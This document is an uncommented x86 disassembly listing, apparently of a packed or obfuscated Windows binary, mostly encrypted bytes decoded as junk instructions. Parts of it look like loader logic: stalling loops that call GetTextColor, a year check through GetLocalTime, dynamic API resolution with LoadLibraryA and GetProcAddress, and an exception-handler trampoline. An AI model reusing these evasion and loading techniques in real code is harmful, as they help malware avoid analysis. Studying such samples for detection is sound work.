jb r-xdata
jb r-xdata
sbb eax 0xbc0bea97
pop ss
sbb eax 0x7272721d
in eax dx
jb r-xdata
sbb eax 0x69caac69
mov edi 0x6930bee
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
sbb eax 0x74d0b1d
aas
jb r-xdata
jb r-xdata
popad
jb r-xdata
imul ebp [ edi - 0x589044fe ] 0xa
mov dl 0x69
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xbf6b0697
jb r-xdata
sbb eax 0x72727272
and [ 0x7272721d ] ebx
xor [ edi ] 0x1d
push ds
jb r-xdata
in eax dx
call sub_45bcd8
loop r-xdata
or dh bl
sub bl [ 0x2267bb1d ]
and ch ch
loop r-xdata
jb r-xdata
jb r-xdata
adc bl [ ebx + 0x1d ]
sbb eax 0x72727272
jb r-xdata
mov ch 0x88
jecxz r-xdata
sbb eax 0xe188b5b5
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
mov dl 0x6b
push 0x52
jb r-xdata
jb r-xdata
sub esp [ ecx ]
jb r-xdata
or edx [ ebx + 0x721d1d06 ]
jb r-xdata
push ss
aaa
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0xed22671d
loop r-xdata
or cl [ ebp + 0x52 ]
jb r-xdata
sbb eax 0xb22e11d
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
les ecx [ ebp + 0x1d ]
lea bx [ edi ]
aas
jb r-xdata
sbb eax 0x89f0bcf
sbb eax 0xd2a66f1d
sbb eax 0xb2f6971d
sbb eax 0xe2e20e75
jb r-xdata
je r-xdata
jb r-xdata
jb r-xdata
stc
loope r-xdata
imul edi [ edi + 0x69818818 ] 0x38
or ebp [ ebx ]
push ecx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x22d1721d
push es
jb r-xdata
sbb eax 0x160b22e1
jb r-xdata
jb r-xdata
xchg esp eax
jb r-xdata
jb r-xdata
or edi edi
jb r-xdata
xchg edi eax
add bl [ 0xffffffffe2e26675 ]
loop r-xdata
sbb eax 0xed22671d
or ecx [ ebp + 0x7 ]
jb r-xdata
push edx
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xchg cx ax
adc ebx [ 0xa7e0b1d ]
sbb eax 0x7272721d
jb r-xdata
sbb [ 0xffffffffa76f721d ] bl
sbb eax 0x900bb294
jb r-xdata
jb r-xdata
sbb eax 0x72727272
loop r-xdata
sbb eax 0x1d074d0b
jb r-xdata
cmpsd [ esi ] [ edi ]
loop r-xdata
loop r-xdata
jb r-xdata
imul ebp [ ebx + 0x16afe11a ] 0x1d244b0b
sbb eax 0xb727272
xchg ebx eax
out 0xe2 al
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
imul edi [ esi - 0x267b162e ] 0x33
or ebx [ ebx + 0x58 ]
sbb eax 0xcaac691d
and ch [ ebx ]
jb r-xdata
test [ ebx - 0x49 ] ch
cmp cl [ ebx ]
dec esi
sbb eax 0x7272721d
or ebx [ ebx ]
jb r-xdata
jb r-xdata
and [ edx + 0x72 ] esi
sbb eax 0x2b22d172
jb r-xdata
and cl [ ebx ]
jb r-xdata
loope r-xdata
jb r-xdata
sbb eax 0x72727272
test [ ebx - 0x49 ] ch
cmp [ eax + 0x6b849288 ] bh
push esp
loop r-xdata
push ss
mov dl 0xb
imul ebp [ edx ] 0x1d
sbb eax 0x72727272
or edx [ eax + 0x721d1d18 ]
outsd
jb r-xdata
jb r-xdata
pop ss
jb r-xdata
jb r-xdata
sbb eax 0x751d0297
pop es
jb r-xdata
jb r-xdata
imul esp [ 0x7221bfbd ] 0x72727272
jb r-xdata
jb r-xdata
imul ebp [ edx ] 0x1d1cbf0b
sbb eax 0x72727272
jb r-xdata
mov [ esp + eax * 4 - 0x47434895 ] cl
mov [ esi + 0x1d0a380b ] al
sbb eax 0x72727272
jb r-xdata
jb r-xdata
test [ ebx - 0x51 ] ch
jb r-xdata
jb r-xdata
mov dl 0xb
jb r-xdata
jb r-xdata
dec ebp
jb r-xdata
push edi
or [ 0x7272721d ] bl
loop r-xdata
jb r-xdata
jb r-xdata
sbb ah cl
jb r-xdata
add [ 0xffffffff8c66ed1d ] ebx
imul ebp [ edi + 0x364d0b2e ] 0x1d
sbb eax 0x72727272
mov [ 0x1d2f690b ] al
sbb eax 0x72727272
sbb eax 0x1d0a7272
daa
sbb eax 0x22d1bb1d
imul esi [ edi - 0x6d7747c8 ] 0xffffff84
imul esi [ edi + 0x510bb83e ] 0x4e
sbb eax 0x7272721d
jb r-xdata
dec esi
jb r-xdata
push esi
sbb eax 0xa72721d
jb r-xdata
out dx al
xor al 0x3b
sbb eax 0xe024611d
shl [ edx ] 0x1
jb r-xdata
jb r-xdata
sbb eax 0x1d0bb11d
or edx [ esi ]
jb r-xdata
mov bh 0x3e
mov eax 0x1d4e510b
mov eax 0x6b849288
scasb [ di ]
cmpsd [ esi ] [ edi ]
loop r-xdata
jb r-xdata
jb r-xdata
loopne r-xdata
jb r-xdata
imul esp [ edi + 0x2eafe136 ] 0x526a6bb2
loop r-xdata
sbb eax 0x67ed2267
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or edx [ 0x721d1d0f ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ch [ edi + edx * 2 ]
jb r-xdata
scasd [ edi ]
jb r-xdata
jb r-xdata
nop
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or edx esp
popad
mov ebx 0xb2267bb
in eax dx
jb r-xdata
popad
xor bl [ 0x7272721d ]
jb r-xdata
inc edx
stosb [ edi ]
0xa20b2569 0x1d50
test [ ebx - 0x51 ] ch
or ecx [ cs : ebp + 0x36 ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
mov eax 0x1d4e510b
loop r-xdata
out dx al
sbb al 0xb
dec edi
add [ 0x7272721d ] bl
jb r-xdata
or edx [ eax ]
push es
and [ bp + 0x1d ] eax
sbb eax 0x1d23fa0b
sbb eax 0x72727272
jb r-xdata
jb r-xdata
cmp [ edi - 0x59 ] ebp
imul esp [ 0x1d50a20b ] 0x7272721d
jb r-xdata
jb r-xdata
aam 0x3e
jb r-xdata
loope r-xdata
fstp [ edi + 0x6930bee ]
out dx eax
and ch ch
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
loop r-xdata
jb r-xdata
nop [ 0x72727272 ] ebx
jb r-xdata
jb r-xdata
jb r-xdata
mov bl 0xb
xlat
call 0xffffffffdc5199cd
xor al 0x1d
jb r-xdata
or ebp esi
mov ch 0xce
or cl [ ecx - 0x44e2e2dc ]
and ch ch
imul edi [ edi + 0x16bf6b02 ] 0xffffff84
fldenv [ esp + 0x17fa61ed ]
jb r-xdata
sbb eax 0xa76f721d
in eax dx
bound esi [ ecx + 0x1d25cb0b ]
sbb eax 0x4acb66ed
sbb eax 0x5aaf6f1d
outsd
cmpsd [ esi ] [ edi ]
dec edx
or dh ah
cmp [ 0xffffffffed22671d ] bl
hlt
sar [ ecx ] 0x1
outsd
cmpsd [ esi ] [ edi ]
and ch ch
jb r-xdata
or esi [ ecx + ecx ]
jb r-xdata
or ecx [ ebx + 0x24 ]
sbb eax 0x7272721d
or edx [ ebx + 0x72e2e2e6 ]
imul edi [ 0x24611931 ] 0xbe6aa0ea
test [ ecx + 0xb ] 0x1d1d5c14
jb r-xdata
cmp ebx [ 0xffffffffe024611d ]
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jno r-xdata
jb r-xdata
pop edx
sbb eax 0x4c710a1d
jb r-xdata
jb r-xdata
mov [ ecx + 0x6b843b69 ] dl
imul edi [ eax ] 0x42bf6b84
jb r-xdata
sbb eax 0xbe02461
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sub ebx [ eax + 0x1d ]
sbb eax 0x66ed2267
cli
loop r-xdata
jb r-xdata
in eax dx
jb r-xdata
or ecx [ edx + 0x33 ]
sbb eax 0x7272721d
jb r-xdata
fcmovnbe st6
jb r-xdata
inc eax
imul edi [ eax ] 0x46bf6b84
mov ecx 0x6b849688
imul ebp [ edx + 0xb2569ea ] 0x1d1d50a2
jb r-xdata
sbb eax 0x7272721d
pop ds
sbb eax 0x17ff0b1d
cli
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x2bbbbb1d
and [ edx + 0x72 ] esi
sub al 0x57
jpe r-xdata
jb r-xdata
loop r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edi - 0x54ae2c2 ] 0xffffffb5
xchg edi eax
sbb eax 0x6971d72
mov edx 0x1d34dc0b
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
mov ah dl
0x4a0be2e2 0x1d3b
or [ 0x7272721d ] ebx
jb r-xdata
jb r-xdata
jb r-xdata
mov eax eax
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xed1aa7db
outsb
jo r-xdata
sbb eax 0xed22671d
jb r-xdata
cmp ebx [ bx + si + 0x1d ]
sbb eax 0x722122d1
jb r-xdata
loop r-xdata
sbb eax 0x1d4c710a
sbb eax 0x67ed2267
out dx eax
das
sbb eax 0x7272721d
jb r-xdata
sbb eax 0xbb1d1d27
shl [ edx ] 0x1
loop r-xdata
sbb eax 0xed22671d
and al 0xe0
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
scasb [ edi ]
mov dl ah
sbb eax 0xe2e24e74
loop r-xdata
sbb eax 0x7272721d
cmpsd [ esi ] [ edi ]
sbb dh [ edx + 0xc0a2469 ]
pop ebp
sbb eax 0x2267bb1d
jb r-xdata
loopne r-xdata
xchg edx eax
sbb eax 0x8590b1d
sbb eax 0x2267721d
or esp edx
add [ 0xffffffffee0ab51d ] ebx
and ebx [ 0x67bbbb1d ]
and cl [ ebx ]
sbb eax 0x1d35170b
sbb [ ecx + 0x1d ] ecx
mov dl al
in eax dx
mov edi 0x9188b944
test [ ebx - 0x41 ] ch
dec edx
mov ecx 0x48bf6b84
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sub al 0x1d
sbb eax 0x8a727272
fsubp st0
sar [ edx + 0x1d34dc0b ] 0x1d
or edx edi
jb r-xdata
sub cl [ ebx ]
sub eax 0x2a691d1d
or edi [ edi + 0x721d1d1c ]
adc [ ecx ] eax
sbb eax 0x8c66ed1d
jb r-xdata
out dx al
loopne r-xdata
mov edi 0x84386940
imul edi [ edi - 0x697746ba ] 0xffffff84
imul edi [ edi - 0x6e7746bc ] 0xffffff84
imul edi [ edi + 0x6b84b94a ] 0xffffffbf
dec eax
jb r-xdata
push es
fdiv [ ebx - 0x68e28de3 ]
jb r-xdata
jb r-xdata
out dx eax
jb r-xdata
sbb eax 0x8a727272
jb r-xdata
jb r-xdata
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e579
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
push rw-data
push ebp
jb r-xdata
clc
jb r-xdata
jb r-xdata
push ecx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sub bl [ 0x7272721d ]
jb r-xdata
loop r-xdata
loop r-xdata
add [ eax ] al
jb r-xdata
jb r-xdata
sbb eax 0xb11dd11d
or esp [ eax + 0x28 ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or ch [ eax + 0xb1d1d13 ]
or [ esi ] eax
sbb [ bx + di + 0x1d ] ecx
cli
in eax dx
loop r-xdata
sbb eax 0x7272721d
jb r-xdata
mov ecx 0x6b849188
mov edi 0x6b84b94a
mov edi 0x6100b48
add eax 0xaf691d1d
0x1f1a676f 0x1d1d
or bh dl
imul edi [ edi - 0x7bc796c0 ] 0x6b
mov edi 0x9688b946
test [ ebx - 0x41 ] ch
inc esp
jb r-xdata
jb r-xdata
xchg ebx eax
jb r-xdata
sbb eax 0x1d3f7a0b
sbb eax 0x72727272
mov dl 0x6f
sbb eax 0x971d721d
jb r-xdata
jb r-xdata
loop r-xdata
and eax 0xb48c3ea7
scasd [ edi ]
scasd [ edi ]
or dh ch
add ebx [ 0xffffffffb9bcbd1d ]
and ch ch
in al 0x26
sbb eax 0x36af6f1d
outsd
cmpsd [ esi ] [ edi ]
or ecx [ es : esi + 0x27 ]
sbb eax 0xb41d721d
fisubr [ ecx + 0x3a ]
or ebx [ edi + 0x28 ]
sbb ebx [ 0x7272721d ]
jb r-xdata
xchg edx eax
mov ebp 0x25699088
test [ ebx - 0x59 ] ch
test [ ebx ] 0x37
jb r-xdata
jb r-xdata
nop
nop
push 0x0
in al dx
jb r-xdata
retn
jb r-xdata
popad
and al ah
test [ edi + 0x22 ] ah
in eax dx
xor ax 0x1d06
sbb eax 0x84e055ed
jb r-xdata
or esp [ ecx + 0x32 ]
sbb eax 0x7272721d
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
cli
and ebx [ 0x7272721d ]
jb r-xdata
out dx eax
loop r-xdata
push es
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x6
je r-xdata
jmp r-xdata
jb r-xdata
pop ebp
jb r-xdata
push ebp
imul ecx [ esi ] 0x69f60e61
adc ah dl
loop r-xdata
imul edi [ edx ] 0x32a76b84
or ecx [ edx + eax + 0x72721d1d ]
jb r-xdata
add [ eax + 0x1d ] cl
sbb eax 0x84bb3c69
imul edi [ edi - 0x7bc596aa ] 0x6b
cmpsd [ esi ] [ edi ]
xor cl [ ebx ]
mov [ edx ] es
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov ch 0xfa
0x1d22 0xb1d
and ch ch
mov [ fs : eax ] esp
add [ ebx ] dh
jb r-xdata
rcl [ ebp - 0x75 ] 0xec
jb r-xdata
sbb eax 0x72727272
mov ch dl
loopne r-xdata
or ebx [ edi + 0x6f1d1d08 ]
cmpsb [ esi ] [ edi ]
sar dl cl
jb r-xdata
iretd
jb r-xdata
test bl bl
jb r-xdata
jb r-xdata
loop r-xdata
and [ 0x7272721d ] ebx
jb r-xdata
mov ebx 0x920b2267
loop r-xdata
mov [ rw-data ] 0x70ec
nop
nop
push rw-data
call GetLocalTime
nop
cmp [ rw-data ] 0x7e1
jb r-xdata
nop
push 0x0
call GetTextColor
jmp r-xdata
jae r-xdata
or cl [ ebx * 2 + 0x67bb1d1d ]
and ch ch
in eax 0x5d
retn 0x4
in eax dx
mov cl 0xb5
or esi [ esi + 0xb1d1d5b ]
adc [ eax + 0x1d ] ebx
mov ebx 0xba222d1
imul ebp [ edi ] 0x72721d1d
jb r-xdata
sbb edx [ esi + 0x1d ]
cmpsd [ esi ] [ edi ]
push ss
or edx [ ebp + 0x58 ]
sbb eax 0xdb72721d
cdq
fsubp st5
les ecx [ di + 0x1d ]
outsd
mov esp 0xbfbd2569
and [ edx + 0x72 ] esi
jb r-xdata
sbb eax 0x72727272
rcl [ ebp + 0x68 ] 0x72
jb r-xdata
mov ebp esp
jb r-xdata
cli
or [ 0xffffffffd2a66f1d ] bl
mov cl 0x1d
mov ah 0xde
or esp edi
lahf
jb r-xdata
salc
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
mov ah 0xa
test al 0x13
sbb eax 0x6090b1d
or cl [ eax ]
inc esp
sbb eax 0xee26611d
loop r-xdata
mov [ rw-data ] 0x5b8b
nop
mov [ rw-data ] 0x1
or edx [ ecx + 0x4e ]
jb r-xdata
push r-xdata
jb r-xdata
jb r-xdata
xor ch [ edi + 0x67 ]
bound ebx [ edi ]
jb r-xdata
sbb eax 0x6772721d
and cl [ ebx ]
sbb eax 0x721d1d4e
jb r-xdata
sbb eax 0xbb6d008a
mov edx 0x4a130bb5
adc [ 0x7272721d ] ebx
jb r-xdata
sbb eax 0xe70bdeb4
scasw [ edi ]
loop r-xdata
nop
nop
push 0x0
call GetTextColor
inc [ rw-data ]
cmp [ rw-data ] 0x1a99
jne r-xdata
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
sbb eax 0xbb5fab5
jb r-xdata
in eax 0x45
jb r-xdata
xor eax eax
jb r-xdata
bound ebx [ bx ]
jb r-xdata
mov [ rw-data ] 0x3177
nop
push 0x0
call GetTextColor
mov [ rw-data ] 0x1
nop
nop
jmp r-xdata
add [ edi + edi * 8 + 0x30 ] ah
jb r-xdata
push ebp
jb r-xdata
pop ds
jb r-xdata
push 0x0
call GetTextColor
inc [ rw-data ]
cmp [ rw-data ] 0x8a0c
jne r-xdata
nop
push 0x0
call GetTextColor
nop
nop
mov eax 0x1fd3a51b
call sub_4026bc
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push [ eax ]
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
sbb eax 0x441d0bb1
jb r-xdata
mov [ rw-data ] 0x1
jb r-xdata
mov ah 0xe2
inc ebp
add bl al
jmp r-xdata
inc ebp
jb r-xdata
or ebx [ 0x721d1d44 ]
jb r-xdata
jb r-xdata
mov ecx 0x8e
xor edx edx
div ecx
cmp edx 0xff
jbe r-xdata
call sub_403174
jae r-xdata
and [ ebx + 0x461bd82d ] al
jb r-xdata
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
push [ fs : eax ]
jb r-xdata
mov edi 0x721d1d1c
sbb eax 0xb2a691d
jb r-xdata
inc esp
jb r-xdata
mov eax [ rw-data ]
add eax [ rw-data ]
jae r-xdata
call sub_40316c
sub eax rw-data
jb r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_403658
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub [ rw-data ] 0x1
xor [ ecx + ecx * 4 + 0x20 ] ah
jb r-xdata
sbb eax 0x72727272
jb r-xdata
shl [ edx ] 0x1
mov [ 0x1d08ee0b ] al
mov [ eax ] dl
nop
inc [ rw-data ]
cmp [ rw-data ] 0x1fd39246
jne r-xdata
call sub_403174
add [ edi ] ecx
sbb eax [ esi ]
jb r-xdata
mov [ eax ] esp
jb r-xdata
sbb eax 0x72727272
jb r-xdata
and ah [ edx + 0x1d08ee0b ]
mov [ ebx + ebp * 2 - 0x77474349 ] es
xchg [ ebx ] cl
jb r-xdata
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
nop
nop
mov eax [ rw-data ]
call sub_4026dc
nop
push r-xdata
push r-xdata
call LoadLibraryA
push eax
call GetProcAddress
mov [ rw-data ] eax
nop
mov [ rw-data ] 0x1
add [ ecx ] al
jb r-xdata
jb r-xdata
cmp [ edx ] cl
sbb eax 0x7272721d
jb r-xdata
push 0x0
call GetTextColor
inc [ rw-data ]
cmp [ rw-data ] 0x89ed
jne r-xdata
xor eax eax
mov [ rw-data ] eax
nop
push rw-data
call [ rw-data ]
nop
jb r-xdata
fcomp [ ebx ]
jb r-xdata
inc ebp
and al 0x85
lodsb [ esi ]
or ah [ edi + 0x11 ]
sbb eax 0x51350b1d
sbb eax 0x7272721d
mov esp 0x1d51740b
sbb eax 0x9f6b1d88
sbb cl [ ebx ]
lea ecx [ edi ]
sbb eax 0xb0b5b41d
pop esp
nop
nop
push 0x12
call Sleep
nop
cmp [ rw-data ] 0x2
jbe r-xdata
nop
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
test [ edx ] al
jb r-xdata
inc esi
jb r-xdata
nop
push rw-data
call [ rw-data ]
mov edx rw-data
mov eax rw-data
call sub_458470
mov [ rw-data ] eax
cmp [ rw-data ] 0x15
jbe r-xdata
nop
push 0x0
call sub_4584f0
nop
nop
mov [ rw-data ] eax
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
call sub_403174
add [ eax ] al
jb r-xdata
jb r-xdata
imul esp [ esi + edx * 4 + 0x1d22b90a ] 0x1d
mov al [ ebx ]
loopne r-xdata
add [ edx + eax - 0x1b980000 ] 0x1b
inc esi
add al ch
retn 0xfa7c
jb r-xdata
mov [ eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
push ebx
or esp [ ebx + 0x721d1d0e ]
jb r-xdata
call GetLocalTime
cmp [ rw-data ] 0x7e1
jb r-xdata
add al [ eax ]
jb r-xdata
imul eax [ edx ] 0x0
add [ eax - 0x17ff9570 ] dl
cli
jle r-xdata
jb r-xdata
add [ eax - 0x1c ] ch
sbb eax [ esi ]
jb r-xdata
push 0x0
call GetTextColor
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ScaleWindowExtEx
call GetLastError
mov [ rw-data ] eax
nop
nop
lea edx [ ebp - 0x4 ]
xor eax eax
call sub_4029e4
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_40bf7c
test eax eax
je r-xdata
[ edx ]
movsb [ edi ] [ esi ]
xchg esi eax
or bh [ ecx - 0x75e2e2de ]
add esp eax
and eax 0xea30b53
sub_45bcd8
mov [ edi - 0x3959947c ] al
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x23617272
mul dl
loop r-xdata
in eax dx
imul esi [ ebx ] 0x38b76b84
jb r-xdata
fdivr [ edx + 0x1d398d0b ]
popad
and ah al
in eax dx
push ebp
shl [ ecx + 0x23 ] cl
loopne r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
loope r-xdata
test [ ebx - 0x49 ] ch
jb r-xdata
cmpsd [ esi ] [ edi ]
or ch [ ecx - 0x59 ]
sbb ch [ ebx - 0x59 ]
adc al 0xed
cmp [ bp + si ] cl
sbb eax 0xbc22d11d
or esi esp
test [ ebx - 0x59 ] ch
jb r-xdata
or edi edx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov eax 0x300bd388
mov bh 0x38
jb r-xdata
sbb eax 0x72727272
jb r-xdata
loop r-xdata
jb r-xdata
scasd [ edi ]
jb r-xdata
sbb cl dl
cmpsd [ esi ] [ edi ]
jb r-xdata
shl [ edx ] 0x1
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
imul esp [ edi - 0x77dd2ee8 ] 0xffffff9a
jb r-xdata
jb r-xdata
cli
jb r-xdata
jb r-xdata
outsd
jb r-xdata
jb r-xdata
mov dl 0xed
loop r-xdata
loop r-xdata
jb r-xdata
call 0x69fa5fd8
sbb cl [ edx ]
jb r-xdata
cmp [ 0xffffffffec66ed1d ] bl
mov al [ 0x1a69b4a0 ]
or ch [ ecx + 0x1 ]
sbb eax 0xf226611d
imul edi [ edx ] 0x3d0b1d67
and eax 0xa9af0ea7
mov ah 0xaf
and eax 0x8baf36a7
adc [ eax - 0x1d05f4f5 ] 0x727272e2
jb r-xdata
sbb eax 0xe2ec66ed
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
mov dl ah
jb r-xdata
jb r-xdata
mov ah dl
jb r-xdata
mov bh 0x1e
jb r-xdata
loop r-xdata
mov cl [ ecx - 0x4b5f5f18 ]
loop r-xdata
loop r-xdata
cmpsd [ esi ] [ edi ]
push cs
scasd [ edi ]
test eax 0xa725afb4
scasd [ edi ]
mov eax [ ecx - 0x5f4f470 ]
in al dx
jb r-xdata
mov [ edx - 0x1d04a2f5 ] bl
loop r-xdata
jb r-xdata
mov eax ebp
pop ebp
in al dx
jb r-xdata
jb r-xdata
and cl [ eax - 0x4a2f466 ]
jb r-xdata
jb r-xdata
sbb eax 0xec66ed1d
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ esi + edi - 0x1e ] 0xffffffe2
jb r-xdata
jb r-xdata
loop r-xdata
outsd
jb r-xdata
pushad
fistp [ ebx + 0x56a76a1d ]
jb r-xdata
jb r-xdata
lodsb [ esi ]
sbb eax 0xed22671d
popfd
call 0xffffffffbde8a1e3
mov ecx 0x7272212b
jb r-xdata
loop r-xdata
jb r-xdata
or ebx [ ebp - 0x5 ]
sub al 0x1d
sbb eax 0xbeabfdb
loop r-xdata
mov cl 0xd1
imul ebx [ edx ] 0x1d01690a
sbb eax 0x69f22661
cmp ah [ edi + 0x1d ]
or edi [ 0xffffffffed1d1d38 ]
test cl bl
sub eax 0xe2e467ed
jb r-xdata
jb r-xdata
0xe2fb5d0b 0x72e2
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
imul ebp [ edx ] 0x18a76b84
mov ebx 0x16af6b84
jb r-xdata
outsb
jb r-xdata
pop ds
jb r-xdata
or eax [ ebx ]
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edx ] 0x3d0b1d67
popad
and al ah
popad
or ah al
and cl [ bp + di ]
imul edi [ ebx ] 0x1d
sbb eax 0xf355ed72
mov cl 0xb4
jb r-xdata
jb r-xdata
jb r-xdata
inc si
sar [ ecx ] 0x1
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
push ds
mov dl 0xb
or [ ebx + 0x6972721d ] edi
xor al 0xd1
and cl [ eax - 0x48947b6a ]
inc eax
mov eax 0x44af6b84
jb r-xdata
or edi [ edi + 0x721d1d33 ]
imul ebp [ edi - 0x7bd596ea ] 0x6b
jb r-xdata
sbb eax 0x2f590a1d
jb r-xdata
sbb eax 0x1d2f590a
sbb eax 0xd880bbb
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
test [ ebx - 0x5a ] ch
or bl [ 0xffffffffbb1d1d06 ]
loop r-xdata
cmp al [ ebx + ebp * 2 + 0x39d1f2bf ]
mov bh 0x7c
jb r-xdata
jb r-xdata
jb r-xdata
xchg esi eax
jb r-xdata
or eax [ esi + 0x8 ]
sbb eax 0x7272721d
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
adc ch [ ecx + 0x2a ]
mov ah cl
test [ ebx - 0x51 ] ch
adc [ ebx + 0x16af6b84 ] bh
add ebx [ 0xffffffff8872721d ]
jb r-xdata
mov ah 0xd9
jb r-xdata
jb r-xdata
jb r-xdata
push ebp
mov eax [ 0xffffffffc80bb286 ]
aas
sbb eax 0xf2e25a1d
loop r-xdata
mov dl 0xed
add bl [ 0xffffffff9f61721d ]
sbb eax 0x30b1eb7
jb r-xdata
loop r-xdata
jb r-xdata
imul esp [ edi - 0x7bda96c4 ] 0x6b
cmpsd [ esi ] [ edi ]
imul esp [ esi - 0x7745213a ] 0xffffff87
push ds
loope r-xdata
add eax [ edx ]
sbb eax 0x9f61721d
and ch ch
cbw
xor ebx [ 0x1de2881d ]
je r-xdata
mov ah 0xa
sbb eax 0xbb1d1d06
lodsb [ esi ]
jb r-xdata
push ss
jb r-xdata
sbb eax 0x880bbb1d
or eax 0x72721d1d
jb r-xdata
or bl [ ecx + 0x2f ]
jb r-xdata
test [ ebx - 0x51 ] ch
jb r-xdata
pop ecx
das
in eax dx
shl dl cl
loop r-xdata
loop r-xdata
push ds
mov esp 0x1d38690b
sbb eax 0x96676f72
xchg esp eax
mov dl 0xb1
sbb eax 0xe2e26275
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
dec eax
jb r-xdata
jb r-xdata
jb r-xdata
mov bh 0xb
mov [ 0xffffffffb7e2e2fb ] al
loop r-xdata
jb r-xdata
loop r-xdata
test [ ebx - 0x41 ] ch
imul edi [ edx ] 0xf2bf6b84
sar [ ecx ] 0x1
or ebx [ ebx + 0x1e ]
sbb eax 0x7272721d
jb r-xdata
imul esi [ edi - 0x58947b84 ] 0x48
jb r-xdata
loop r-xdata
jb r-xdata
outsd
mov ah 0x6f
out 0xb al
sub [ 0xffffffff87881d1d ] esp
test [ ebx - 0x59 ] ch
add al 0xba
mov [ ecx + ebp * 2 - 0x50947bd6 ] cl
or bh [ ebx + 0x6b848588 ]
scasd [ edi ]
or [ ebx + 0x6b848b88 ] bh
scasd [ edi ]
push cs
mov ebx 0x6b848c88
scasd [ edi ]
or al 0xbb
test [ ebx - 0x51 ] ch
or eax [ ebp + 0x3 ]
and ch ch
sbb ebp ebp
jb r-xdata
mov bh 0xb
jb r-xdata
push ds
jb r-xdata
jb r-xdata
jb r-xdata
sbb [ 0x55edb51d ] ebx
not [ ebx + 0x1d393a0b ]
sbb eax 0x72727272
jb r-xdata
sub al [ ebx + ebp * 2 + 0x22d118a7 ]
push 0xffffffa7
push es
or esp [ ecx + 0x38 ]
sbb eax 0x7272721d
jb r-xdata
push esi
scasd [ edi ]
jb r-xdata
loop r-xdata
or eax edx
jb r-xdata
cmpsd [ esi ] [ edi ]
push ds
jecxz r-xdata
retn 0xe2e2
or eax [ ecx + edi * 8 ]
in eax dx
jb r-xdata
jb r-xdata
and ch ch
or edi [ ebx + 0x2e ]
jb r-xdata
push ds
mov dl 0x1d
